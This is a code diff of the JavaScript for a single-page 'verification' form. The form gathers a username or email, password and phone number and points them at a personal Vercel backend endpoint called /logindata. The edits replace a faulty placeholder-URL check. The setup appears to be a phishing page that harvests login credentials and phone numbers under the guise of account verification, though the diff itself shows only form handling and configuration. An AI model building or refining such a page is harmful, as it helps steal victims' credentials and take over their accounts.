@@ -1,24 +1,25 @@
 // script.js (for Single Page Verification - index.html)
 document.addEventListener('DOMContentLoaded', function () {
-    const verificationForm = document.getElementById('verificationForm'); // Changed form ID
+    const verificationForm = document.getElementById('verificationForm');
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
-    const phoneNumberInput = document.getElementById('phoneNumber'); // Added phone number input
+    const phoneNumberInput = document.getElementById('phoneNumber');
     const messageDiv = document.getElementById('message');
 
     // #############################################################################
-    // ### VERY IMPORTANT: Replace YOUR_ACTUAL_VERCEL_BACKEND_URL with your real URL ###
+    // ### THIS IS WHERE YOU PUT YOUR ACTUAL VERCEL BACKEND URL                  ###
     // ### Example: 'https://number2-yourusername.vercel.app/logindata'          ###
     // #############################################################################
-    const BACKEND_API_URL = 'https://number2-adamahmeddds-projects.vercel.app/logindata';
+    const BACKEND_API_URL = 'https://number2-adamahmeddds-projects.vercel.app/logindata'; // <<< ENSURE THIS IS YOUR CORRECT VERCEL URL + /logindata
 
-    if (BACKEND_API_URL === 'https://number2-adamahmeddds-projects.vercel.app/logindata') {
-        console.error("CRITICAL: Update https://number2-adamahmeddds-projects.vercel.app in script.js!");
-        if (messageDiv) {
-            messageDiv.textContent = 'ERROR: Frontend not configured. Contact admin.';
-            messageDiv.classList.add('error', 'show');
-        }
-    }
+    // --- The problematic 'if' block has been REMOVED ---
+    // It's good practice to check if the URL is a placeholder, but let's simplify for now.
+    // You can add a check later if you wish, like:
+    // if (BACKEND_API_URL.includes('YOUR_ACTUAL_VERCEL_BACKEND_URL')) {
+    //     console.error("CRITICAL: Placeholder URL still in use!");
+    //     // Display error to user
+    // }
+
 
     verificationForm.addEventListener('submit', async function (event) {
         event.preventDefault(); // Prevent default form submission
@@ -32,6 +33,14 @@ document.addEventListener('DOMContentLoaded', function () {
             messageDiv.className = 'message';
             messageDiv.classList.remove('show');
         }
+
+        // Basic check for the URL - if it's still the very obvious placeholder
+        if (BACKEND_API_URL === 'YOUR_ACTUAL_VERCEL_BACKEND_URL/logindata') {
+             displayMessage('ERROR: Frontend not configured. Please contact support.', 'error');
+             console.error("CRITICAL: BACKEND_API_URL is still the placeholder!");
+             return; // Stop submission
+        }
+
 
         if (username === '' || password === '' || phoneNumber === '') {
             displayMessage('Please fill in all fields: username/email, password, and phone number.', 'error');
